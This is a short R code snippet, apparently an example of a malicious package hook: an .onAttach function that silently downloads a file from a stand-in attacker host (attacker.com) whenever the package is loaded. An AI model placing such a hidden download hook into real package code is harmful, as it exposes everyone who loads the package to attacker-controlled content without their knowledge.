.onAttach <- function(libname, pkgname) {
  curl::curl_download("https://attacker.com/payload", destfile = tempfile())
}
